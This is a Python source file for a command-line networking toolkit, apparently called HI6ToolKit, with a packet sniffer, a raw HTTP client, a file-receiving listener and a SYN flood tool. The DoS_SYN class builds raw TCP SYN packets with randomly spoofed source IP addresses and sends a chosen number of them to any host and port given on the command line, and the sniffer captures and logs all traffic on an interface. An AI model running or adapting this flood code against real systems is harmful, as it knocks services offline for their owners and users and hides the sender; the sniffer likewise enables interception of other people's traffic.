#!/usr/bin/python3
import socket
import struct
import signal
import ssl
import sys
import os
import random
import time
import argparse


class Constant :
    MODULE : bool = __name__ != "__main__"
    TIME : int = round(time.time())
    ISOS : bool = any([os in sys.platform for os in ("linux", "bsd", "darwin")])
    SUP_COLOR : bool = any(word in os.getenv("TERM") for word in ("linux", "xterm", "color")) if ISOS else False
    SLASH : str = chr(47)
    TOOLS : dict = dict()
    INFO : str = f"""\n
        [System] : [{sys.platform.upper()}, {time.ctime()}]
        [Hostname] : [{socket.gethostname()}]
        [Python] : [{sys.implementation.name.title()} {sys.version_info[0]}.{sys.version_info[1]}]

        [GitHub] : [github.com/HI6Cypher]
        [Email] : [huaweisclu31@hotmail.com]\n\n"""

    def SIGNAL(signum : int, stk_frm : "frame") :
        EXCEPTION : None = lambda error : print("\n\n[" + Constant.RED("!") + "]" + f" Error : {error or None}", file = sys.stderr)
        EXCEPTION(Constant.RED(" **SIGNAL** ") + f"sig_num : {Constant.YELLOW(signal.Signals(signum).name)}")
        sys.exit(1)
        return None

    def RED(text : str) :
        red = "\33[91m"
        end = "\33[0m"
        return red + text + end if Constant.SUP_COLOR else text

    def GREEN(text : str) :
        green = "\33[92m"
        end = "\33[0m"
        return green + text + end if Constant.SUP_COLOR else text

    def YELLOW(text : str) :
        yellow = "\33[93m"
        end = "\33[0m"
        return yellow + text + end if Constant.SUP_COLOR else text


class Sniff :
    def __init__(self, iface : str) :
        self.iface = iface
        self.generator = None
        self.check_interface()
        self.check_eth_p_all()

    def __repr__(self) :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) :
        return f"Sniff : \n\t{self.iface}"

    def __iter__(self) :
        self.generator = self.sniff()
        return self

    def __next__(self) :
        try :
            result = next(self.generator)
        except StopIteration :
            self.generator = None
            raise StopIteration
        else : return result

    def parse_eth_header(self, data : bytes) :
        parsed_header = str()
        t = "\n\t\t"
        dst, src, typ = self.eth_header(data)
        parsed_header += f"Ethernet Frame :{t}Source MAC : {src}{t}Destination MAC : {dst}{t}Ethernet Type : {typ}"
        return parsed_header, typ

    def parse_arp_header(self, data : bytes) :
        parsed_header = str()
        t = "\n\t\t"
        hdr, pro, hln, pln, opc, sha, spa, tha, tpa = self.arp_header(data)
        parsed_header += f"Arp Datagram :{t}Hardware Type : {hdr}{t}Protocol Type : {pro}{t}Hardware Length : {hln}"
        parsed_header += f"{t}Protocol Length : {pln}{t}Opcode : {opc}{t}Sender Hardware Address : {sha}"
        parsed_header += f"{t}Sender Protocol Address : {spa}{t}Target Hardware Address : {tha}"
        parsed_header += f"{t}Target Protocol Address : {tpa}"
        return parsed_header

    def parse_ip_header(self, data : bytes) :
        parsed_header = str()
        t = "\n\t\t"
        ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst = self.ip_header(data)
        parsed_header += f"IPv4 Datagram :{t}Version : {ver}  Header Length : {ihl}  Time of Service : {tos}"
        parsed_header += f"{t}Total Length : {tln}  Identification : {idn}  Flags : {flg}"
        parsed_header += f"{t}Fragment Offset : {oft}  TTL : {ttl}  Protocol : {prt}"
        parsed_header += f"{t}Checksum : {csm}  Source : {src}  Destination : {dst}"
        return parsed_header, ihl, prt

    def parse_tcp_header(self, data : bytes) :
        parsed_header = str()
        t = "\n\t\t"
        src, dst, seq, acn, oft, flg, win, csm, urg, data = self.tcp_header(data)
        parsed_header += f"TCP Segment :{t}Source Port : {src}{t}Destination Port : {dst}{t}Sequence : {seq}{t}Acknowledgment : {acn}{t}Data Offset : {oft}{t}Flags :{t}\t"
        parsed_header += f"URG:{flg['urg']}  ACK:{flg['ack']}  PSH:{flg['psh']}{t}\tRST:{flg['rst']}  SYN:{flg['syn']}  FIN:{flg['fin']}{t}"
        parsed_header += f"Window : {win}{t}Checksum : {csm}{t}Urgent Pointer : {urg}{t}Raw Data :\n{self.indent_data(data)}"
        return parsed_header

    def parse_udp_header(self, data : bytes) :
        parsed_header = str()
        t = "\n\t\t"
        src, dst, tln, csm, data = self.udp_header(data)
        parsed_header += f"UDP Segment :{t}Source Port : {src}{t}Destination Port : {dst}{t}Length : {tln}{t}Checksum : {csm}{t}Raw Data :\n{self.indent_data(data)}"
        return parsed_header

    def parse_icmp_header(self, data : bytes) :
        parsed_header = str()
        t = "\n\t\t"
        typ, cod, csm, idn, seq, data = self.icmp_header(data)
        parsed_header += f"ICMP Datagram :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {csm}{t}Identifier : {idn}{t}Sequence : {seq}{t}Raw Data :\n{self.indent_data(data)}"
        return parsed_header

    def parse_headers(self, raw_data : bytes) :
        parsed_headers = str()
        spec_header = f"[+][DATALINK]________________{Constant.TIME}________________"
        eth_data = raw_data[:14]
        parsed_eth_header, typ = self.parse_eth_header(eth_data)
        match typ :
            case "IPv4" :
                ip_data = raw_data[14:]
                parsed_ip_header, ihl, prt = self.parse_ip_header(ip_data)
                match prt :
                    case "TCP" :
                        tcp_data = raw_data[14 + ihl:]
                        transport_layer_header = self.parse_tcp_header(tcp_data)
                    case "UDP" :
                        udp_data = raw_data[14 + ihl:]
                        transport_layer_header = self.parse_udp_header(udp_data)
                    case "ICMP" :
                        icmp_data = raw_data[14 + ihl:]
                        transport_layer_header = self.parse_icmp_header(icmp_data)
                    case _ :
                        transport_layer_header = f"{prt} : unimplemented transport layer protocol"
                parsed_headers += spec_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_eth_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_ip_header
                parsed_headers += "\n\n"
                parsed_headers += transport_layer_header
                parsed_headers += "\n\n"
                return parsed_headers
            case "ARP" :
                arp_data = raw_data[14:]
                parsed_arp_header = self.parse_arp_header(arp_data)
                parsed_headers += spec_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_eth_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_arp_header
                parsed_headers += "\n\n"
                return parsed_headers
            case _ :
                parsed_headers += spec_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_eth_header
                parsed_headers += "\n\n"
                parsed_headers += f"{typ} : unimplemented network layer protocol"
                parsed_headers += "\n\n"
                return parsed_headers

    def check_interface(self) :
        ifaces = [iface[-1] for iface in socket.if_nameindex()]
        if self.iface not in ifaces :
            raise OSError(f"{self.iface} not in {ifaces}")
        self.iface = self.iface.encode()
        return None

    def check_eth_p_all(self) :
        if "ETH_P_ALL" not in socket.__all__ :
            socket.ETH_P_ALL = 3
        return None

    def sniff(self) :
        if not Constant.MODULE :
            print(Constant.YELLOW(Constant.INFO))
            input("\nPress ENTER to continue...\n")
        while True :
            yield self.__sniff()

    @staticmethod
    def eth_header(raw_payload : bytes) :
        payload = struct.unpack("!6s6sH", raw_payload)
        standardize_mac_addr : str = lambda x : ":".join([f"{sec:02x}" for sec in x])
        dst = standardize_mac_addr(payload[0])
        src = standardize_mac_addr(payload[1])
        protos = {
            0x0800 : "IPv4",
            0x86dd : "IPv6",
            0x0806 : "ARP"
            }
        typ = protos.get(payload[2], payload[2])
        return dst, src, typ

    @staticmethod
    def ip_header(raw_payload : bytes) :
        payload = struct.unpack("!BBHHHBBH4s4s", raw_payload[:20])
        ver = payload[0] >> 4
        ihl = (payload[0] & 0xf) * 4
        tos = payload[1]
        tln = payload[2]
        idn = payload[3]
        flg = payload[4] >> 13
        oft = payload[4] & 0x1fff
        ttl = payload[5]
        protos = {
            0x0001 : "ICMP",
            0x0006 : "TCP",
            0x0011 : "UDP"
            }
        prt = protos.get(payload[6], payload[6])
        csm = hex(payload[7])
        src = socket.inet_ntop(socket.AF_INET, payload[8])
        dst = socket.inet_ntop(socket.AF_INET, payload[9])
        return ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst

    @staticmethod
    def arp_header(raw_payload : bytes) :
        payload = struct.unpack("!HHBBH6s4s6s4s", raw_payload[:28])
        standardize_mac_addr : str = lambda x : ":".join([f"{sec:02x}" for sec in x])
        hdr = "Ethernet(1)" if payload[0] == 1 else payload[0]
        protos = {
            0x0800 : "IPv4",
            0x86dd : "IPv6"
            }
        pro = protos.get(payload[1], payload[1])
        hln = payload[2]
        pln = payload[3]
        opcodes = {
            0x0001 : "ARP REQ",
            0x0002 : "ARP REP"
            }
        opc = opcodes.get(payload[4], payload[4])
        sha = standardize_mac_addr(payload[5])
        spa = socket.inet_ntop(socket.AF_INET, payload[6])
        tha = standardize_mac_addr(payload[7])
        tpa = socket.inet_ntop(socket.AF_INET, payload[8])
        return hdr, pro, hln, pln, opc, sha, spa, tha, tpa

    @staticmethod
    def tcp_header(raw_payload : bytes) :
        payload = struct.unpack("!HHLLBBHHH", raw_payload[:20])
        src = payload[0]
        dst = payload[1]
        seq = payload[2]
        acn = payload[3]
        oft = (payload[4] >> 4) * 4
        flg = payload[5]
        urg = (flg & 32) >> 5
        ack = (flg & 16) >> 4
        psh = (flg & 8) >> 3
        rst = (flg & 4) >> 2
        syn = (flg & 2) >> 1
        fin = flg & 1
        flg = {
            "urg" : urg,
            "ack" : ack,
            "psh" : psh,
            "rst" : rst,
            "syn" : syn,
            "fin" :fin
                }
        win = payload[6]
        csm = hex(payload[7])
        urg = payload[8]
        data = raw_payload[oft:]
        return src, dst, seq, acn, oft, flg, win, csm, urg, data

    @staticmethod
    def udp_header(raw_payload : bytes) :
        payload = struct.unpack("!HHHH", raw_payload[:8])
        src = payload[0]
        dst = payload[1]
        tln = payload[2]
        csm = hex(payload[3])
        data = raw_payload[8:]
        return src, dst, tln, csm, data

    @staticmethod
    def icmp_header(raw_payload : bytes) :
        payload = struct.unpack("!BBHHH", raw_payload[:8])
        typ = payload[0]
        cod = payload[1]
        csm = hex(payload[2])
        idn = payload[3]
        seq = payload[4]
        data = raw_payload[8:]
        return typ, cod, csm, idn, seq, data

    @staticmethod
    def indent_data(data : bytes) :
        data = str(data).strip("b'\"")
        text = "\t\t\t"
        for i in range((len(data) // 64) + 1) :
            text += data[i * 64 : ((i + 1) * 64)] + "\n\t\t\t"
        return text

    @staticmethod
    def tmp_file(data : str) :
        path = f"data_{Constant.TIME}.txt"
        mode = "a" if os.path.exists(path) else "x"
        print(data, file = open(path, mode))
        return None

    def __sniff(self) :
        with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(socket.ETH_P_ALL)) as sniff :
            sniff.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, self.iface)
            while True :
                raw_data = sniff.recvfrom(65535)[0]
                if raw_data :
                    raw_data = raw_data
                    parsed_headers = self.parse_headers(raw_data)
                    parsed_headers = parsed_headers.expandtabs(4)
                    self.tmp_file(parsed_headers)
                    return parsed_headers, raw_data


class DoS_SYN :
    def __init__(self, host: str, port : int, rate : int) :
        self.host = host
        self.port = int(port)
        self.rate = rate

    def __repr__(self) :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) :
        return f"DoS_SYN : \n\t{self.host}\n\t{self.port}"

    def prepare(self) :
        randip = self.random_ip()
        randidn = random.randint(0, 65535)
        src = socket.inet_pton(socket.AF_INET, randip)
        dst = socket.inet_pton(socket.AF_INET, self.host)
        ip_header = self.ip_header(src = src, dst = dst, idn = randidn)
        checksum = self.checksum(ip_header)
        ip_header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum)
        randseq = random.randint(0, 65535)
        tcp_header = self.tcp_header(dsp = self.port, seq = randseq, syn = 1)
        pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(tcp_header))
        data = tcp_header + pseudo_header
        tcp_checksum = self.checksum(data)
        tcp_header = self.tcp_header(dsp = self.port, seq = randseq, syn = 1, csm = tcp_checksum)
        payload = ip_header + tcp_header
        return payload

    def flood(self) :
        if not Constant.MODULE :
            print(Constant.YELLOW(Constant.INFO))
            input("\nPress ENTER to continue...\n")
        self.__flood()
        return None

    @staticmethod
    def ip_header(src : str, dst : str,
        ver : int = 4, ihl : int = 5,
        tos : int = 0, tln : int = 40,
        idn : int = 0, flg : int = 0,
        oft : int = 0, ttl : int = 255,
        prt : int = socket.IPPROTO_TCP, csm : int = 0) :
        ihl_ver = (ver << 4) + ihl
        flg_oft = (flg << 13) + oft
        datagram = struct.pack("!BBHHHBBH4s4s", ihl_ver, tos, tln, idn, flg_oft, ttl, prt, csm, src, dst)
        return datagram

    @staticmethod
    def tcp_header(srp : int = 1337, dsp : int = 0,
        seq : int = 0, acn : int = 0,
        oft : int = 5, urg : int = 0,
        ack : int = 0, psh : int = 0,
        rst : int = 0, syn : int = 0,
        fin : int = 0, win : int = 65535,
        csm : int = 0, urp : int = 0) :
        oft <<= 12
        res = 0 << 6
        flg = (urg << 5) + (ack << 4) + (psh << 3) + (rst << 2) + (syn << 1) + fin
        oft_res_flg = oft + res + flg
        segment = struct.pack("!HHLLHHHH", srp, dsp, seq, acn, oft_res_flg, win, csm, urp)
        return segment

    @staticmethod
    def pseudo_header(src : str, dst : str,
        res : int = 0, prt : int = socket.IPPROTO_TCP,
        pln : int = 0) :
        segment = struct.pack("!4s4sBBH", src, dst, res, prt, pln)
        return segment

    @staticmethod
    def checksum(data : bytes) :
        checksum = 0
        for i in range(0, len(data), 2) :
            word = (data[i] << 8) + data[i + 1]
            checksum += word
        checksum = (checksum >> 16) + (checksum & 65535)
        checksum = (~ checksum) & 65535
        return checksum

    @staticmethod
    def random_ip() :
        secs = [str(random.randint(0, 255)) for _ in range(0, 4)]
        return ".".join(secs)

    @staticmethod
    def progress_bar(x : int, y : int) :
        symbol = Constant.SLASH
        if y < 32 : return 32 * symbol if x == y else 0 * symbol
        sec = y // 32
        now = x // sec
        return now * symbol

    def __flood(self) :
        count = 0
        while count != self.rate :
            payload = self.prepare()
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as flood :
                flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                flood.connect((self.host, self.port))
                flood.sendto(payload, (self.host, self.port))
                flood.shutdown(socket.SHUT_RDWR)
            count += 1
            text = "[" + Constant.GREEN("+") + "]" + " " + f"{self.progress_bar(count, self.rate)}" + " " + f"[{count}/{self.rate}]"
            print(text, end = "\r", flush = True)
        else :
            end_time = round((time.time() - Constant.TIME), 2)
            print("\n[" + Constant.GREEN("+") + "]" + " " + "all SYN segments have sent")
            print("[" + Constant.GREEN("+") + "]" + " " + f"{end_time}s")
        return None


class HTTP_Request :
    def __init__(self, host : str, port : int, method : str, header : str, end : str, https : bool) :
        self.host = host
        self.port = int(port)
        self.method = method if method in ("GET", "HEAD") else "GET"
        self.header = header
        self.end = end if end else "/"
        self.https = bool(https)
        self.request_header = str()
        self.response = bytes()
        self.response_header = str()

    def __repr__(self) :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) :
        return f"HTTP_Request : \n\t{self.host}\n\t{self.port}"

    def request(self) :
        if not Constant.MODULE :
            print(Constant.YELLOW(Constant.INFO))
            input("\nPress ENTER to continue...\n")
        self.__request()
        return None

    def __request(self) :
        if self.https : sslcontext = ssl.create_default_context()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as http :
            http.settimeout(30)
            http = sslcontext.wrap_socket(http, server_hostname = self.host) if self.https else http
            payload = [
                f"{self.method} {self.end} HTTP/1.1",
                f"Host: {self.host}",
                "User-Agent: HI6ToolKit",
                "Accept: */*",
                "Connection: close",
                "\r\n"
                ] if not self.header else self.header
            payload = "\r\n".join(payload) if not self.header else payload
            self.request_header = payload
            if not Constant.MODULE : print(payload)
            http.connect((self.host, self.port))
            http.send(payload.encode())
            raw_data = bytes()
            while True :
                response = http.recv(1024)
                if not response :
                    raw_data = raw_data.split(b"\r\n\r\n", 1)
                    self.response_header = raw_data[0].decode()
                    self.response = raw_data[-1]
                    if not Constant.MODULE :
                        print(self.response_header, end = "\n\n")
                        if self.method == "GET" : print(self.response)
                    if self.https : http.close()
                    break
                else :
                    raw_data += response
        return None


class Tunnel :
    def __init__(self, host : str, port : int, timeout : int, buffer : int) :
        self.host = host
        self.port = port
        self.timeout = timeout
        self.buffer = buffer
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)

    def __repr__(self) :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) :
        return f"Tunnel : \n\t{self.host}\n\t{self.port}"

    def tunnel(self) :
        if not Constant.MODULE :
            print(Constant.YELLOW(Constant.INFO))
            input("\nPress ENTER to continue...\n")
        self.__tunnel()
        return None

    def init_server(self) :
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.settimeout(self.timeout)
        self.sock.bind((self.host, self.port))
        self.sock.listen(1)
        return None

    def get_header(self, sock : socket.socket) :
        header = bytes()
        while not header.endswith(b"\r\n\r\n") :
            header += self.readline(sock)
        else : return header.decode()

    @staticmethod
    def open_file(name : str) :
        path = f"./{name}"
        mode = "ab" if os.path.exists(path) else "wb"
        return open(path, mode)

    @staticmethod
    def tmp_file(file : "open", data : bytes) :
        file.write(data)
        return None

    @staticmethod
    def parse_headers(data : bytes) :
        headers = {header.split(": ", 1)[0] : header.split(": ", 1)[-1] for header in data.split("\r\n")[1:-1]}
        headers["status"] = data.split("\r\n", 1)[0].split(" ")[0]
        headers["name"] = data.split("\r\n", 1)[0].split(" ")[1][1:]
        headers["version"] = data.split("\r\n", 1)[0].split(" ")[-1]
        return headers

    @staticmethod
    def get_name(headers : dict) :
        keyword = "name"
        if keyword in headers :
            return headers[keyword] + f"_{round(time.time())}"  + ".tmp"
        else : return f"new_{round(time.time())}.tmp"

    @staticmethod
    def get_length(headers : dict) :
        keyword = "Content-Length"
        if keyword in headers :
            return int(headers[keyword])
        else : return 0

    @staticmethod
    def get_status(headers : dict) :
        keyword = "status"
        if keyword in headers :
            return headers[keyword]
        else : raise Exception("couldn't find status")

    @staticmethod
    def get_version(headers : dict) :
        keyword = "version"
        if keyword in headers :
            return headers[keyword]
        else : return "HTTP/1.0"

    @staticmethod
    def get_parts(length : int, buffer : int) :
        if buffer > length : return length, 0
        npart = length // buffer
        nrimd = length % buffer
        return nrimd, npart

    @staticmethod
    def readline(sock : socket.socket) :
        line = bytes()
        while not line.endswith(b"\r\n") :
            line += sock.recv(1)
        else : return line

    @staticmethod
    def readbuffer(sock : socket.socket, buffer : int) :
        data = bytes()
        while len(data) != buffer :
            data += sock.recv(buffer - len(data))
        else : return data

    @staticmethod
    def write(sock : socket.socket, data : bytes) :
        data = data if isinstance(data, bytes) else data.encode()
        sock.sendall(data)
        return None

    @staticmethod
    def prepare_response(version : str, success : bool) :
        if success :
            payload = [
            f"{version} 200 OK",
            "User-Agent: HI6ToolKit",
            "\r\n"
            ]
        else :
            payload = [
                f"{version} 400 Bad Request",
                "User-Agent: HI6ToolKit",
                "\r\n"
                ]
        payload = "\r\n".join(payload).encode()
        return payload

    @staticmethod
    def progress_bar(x : int, y : int) :
        symbol = Constant.SLASH
        if y < 32 : return 32 * symbol if x == y else 0 * symbol
        sec = y // 32
        now = x // sec
        return now * symbol

    @staticmethod
    def percent(x : int, y : int) :
        return round((x / y) * 100)

    def __tunnel(self) :
        print("[" + Constant.GREEN("+") + "]" + " " + "run init_server()", end = "  ", flush = True)
        self.init_server()
        print(Constant.GREEN("DONE"))
        print("[" + Constant.GREEN("+") + "]" + " " + "run socket.accept()")
        conn, addr = self.sock.accept()
        print("[" + Constant.GREEN("+") + "]" + " " + f"new connection from {addr[0]}:{addr[-1]}")
        headers = self.parse_headers(self.get_header(conn))
        print("[" + Constant.GREEN("+") + "]" + " " + "parsing header", end = "  ", flush = True)
        status, name, version, length = self.get_status(headers), self.get_name(headers), self.get_version(headers), self.get_length(headers)
        print(Constant.GREEN("DONE"))
        if not length :
            print("[" + Constant.GREEN("+") + "]" + " " + f"couldn't find Content-Length, send Bad Request to {addr[0]}:{addr[-1]}", end = "  ", flush = True)
            payload = self.prepare_response(version, False)
            self.write(conn, payload)
            print(Constant.GREEN("DONE"))
            sys.exit()
        send_length = 0
        tail, parts = self.get_parts(length, self.buffer)
        file = self.open_file(name)
        OUTPUT : str = lambda x, y : "[" + Constant.GREEN("*") + "]" + " " + self.progress_bar(x, y) + " " + f"[{self.percent(x, y)}%]" + f"[{x}/{y}]"
        while parts != 0 :
            data = self.readbuffer(conn, self.buffer)
            self.tmp_file(file, data)
            send_length += self.buffer
            print(OUTPUT(send_length, length), end = "\r", flush = True)
            parts -= 1
        else :
            data = self.readbuffer(conn, tail)
            self.tmp_file(file, data)
            send_length += tail
            print(OUTPUT(send_length, length), end = "\r", flush = True)
            print("\n[" + Constant.GREEN("+") + "]" + " " + f"sending OK to {addr[0]}:{addr[-1]}", end = "  ", flush = True)
            payload = self.prepare_response(version, True)
            self.write(conn, payload)
            print(Constant.GREEN("DONE"))
        return None


if not Constant.MODULE :
    def manage_args() :
        global Sniff_args, DoS_SYN_args, HTTP_Request_args, Tunnel_args
        parser = argparse.ArgumentParser(prog = "HI6ToolKit", add_help = True)
        subparser = parser.add_subparsers(title = "tools")
        info_tool = subparser.add_parser("info", help = "print informations about os, system etc.")
        info_tool.set_defaults(func = info_args)
        sniff_tool = subparser.add_parser("sniff", help = "execute Sniff class")
        sniff_tool.add_argument("-i", "--iface", type = str, help = "sets interface for socket.SO_BINDTODEVICE")
        sniff_tool.set_defaults(func = Sniff_args)
        dos_tool = subparser.add_parser("dos", help = "execute DoS_SYN class")
        dos_tool.add_argument("-x", "--host", type = str, help = "sets host for flooding")
        dos_tool.add_argument("-p", "--port", type = int, help = "sets port for flooding")
        dos_tool.add_argument("-r", "--rate", type = int, help = "sets rate(number of packets)")
        dos_tool.set_defaults(func = DoS_SYN_args)
        http_tool = subparser.add_parser("http", help = "execute HTTP_Request class")
        http_tool.add_argument("-x", "--host", type = str, help = "sets host for http request")
        http_tool.add_argument("-p", "--port", type = int, help = "sets port for http request", default = 80)
        http_tool.add_argument("-m", "--method", type = str, help = "sets request type(GET or HEAD)", default = "GET")
        http_tool.add_argument("-c", "--custom", type = str, help = "sets custome header for HTTP_Request", default = str())
        http_tool.add_argument("-e", "--endpoint", type = str, help = "sets endpoint", default = "/")
        http_tool.add_argument("-s", "--secure", action = "store_true", help = "sets secure socket(ssl)", default = False)
        http_tool.set_defaults(func = HTTP_Request_args)
        tunnel_tool = subparser.add_parser("tunnel", help = "execute Tunnel class")
        tunnel_tool.add_argument("-x", "--host", type = str, help = "sets host", default = "0.0.0.0")
        tunnel_tool.add_argument("-p", "--port", type = int, help = "sets port", default = "80")
        tunnel_tool.add_argument("-b", "--buffer", type = int, help = "sets bufferSize, should be in (1024, 2048, 4096,...)", default = 2048)
        tunnel_tool.add_argument("-t", "--time", type = int, help = "sets timeout", default = 60)
        tunnel_tool.set_defaults(func = Tunnel_args)
        args = parser.parse_args()
        return args

    def invalid_args(arg : str) :
        ERROR : str = lambda arg : print(Constant.RED(f"\nInvalid argument : \"{arg}\"\nType : \"python hi6toolkit.py [--help | -h]\""), file = sys.stderr)
        ERROR(arg)
        sys.exit(1)
        return None

    def check(**kwargs : dict) :
        nones = list()
        for k, v in kwargs.items() :
            if not v : nones.append(k)
        return (True, nones) if not nones else (False, nones)

    def info_args() :
        print(Constant.YELLOW(Constant.INFO))
        return None

    def Sniff_args() :
        global args
        args = {
            "iface" : args.iface
            }
        success, nones = check(**args)
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        iface = args["iface"]
        sniff = Sniff(iface)
        for packet, _ in sniff :
            print(packet)
        return None

    def DoS_SYN_args() :
        global args
        args = {
            "host" : args.host,
            "port" : args.port,
            "rate" : args.rate
            }
        success, nones = check(**args)
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        host = socket.gethostbyname(args["host"])
        port = args["port"]
        rate = args["rate"]
        flood = DoS_SYN(host, port, rate)
        flood.flood()
        return None

    def HTTP_Request_args() :
        global args
        args = {
            "host" : args.host,
            "port" : args.port,
            "method" : args.method,
            "header" : args.custom,
            "endpoint" : args.endpoint,
            "secure" : args.secure
            }
        success, nones = check(host = args["host"], port = args["port"], method = args["method"])
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        host = args["host"]
        port = args["port"]
        method = args["method"].upper()
        header = args["header"].replace("_", "\r\n")
        path = args["endpoint"]
        secure = args["secure"]
        client = HTTP_Request(host, port, method, header, path, secure)
        client.request()
        return None

    def Tunnel_args() :
        global args
        args = {
            "host" :  args.host,
            "port" : args.port,
            "timeout" :  args.time,
            "buffer" : args.buffer
            }
        success, nones = check(**args)
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        host = args["host"]
        port = args["port"]
        timeout = args["timeout"]
        buffer = args["buffer"]
        tunnel = Tunnel(host, port, timeout, buffer)
        gen = tunnel.tunnel()
        return None

    def main() :
        global args
        os.system("clear || cls")
        signal.signal(signal.SIGINT, Constant.SIGNAL)
        signal.signal(signal.SIGTERM, Constant.SIGNAL)
        signal.signal(signal.SIGQUIT, Constant.SIGNAL)
        signal.signal(signal.SIGILL, Constant.SIGNAL)
        signal.signal(signal.SIGSEGV, Constant.SIGNAL)
        signal.signal(signal.SIGBUS, Constant.SIGNAL)
        signal.signal(signal.SIGPIPE, Constant.SIGNAL)
        signal.signal(signal.SIGABRT, Constant.SIGNAL)
        if not Constant.ISOS : sys.exit(1)
        args = manage_args()
        if "func" in vars(args) :
            args.func()
        else :
            invalid_args("argument NOT found")
        return True

    main()
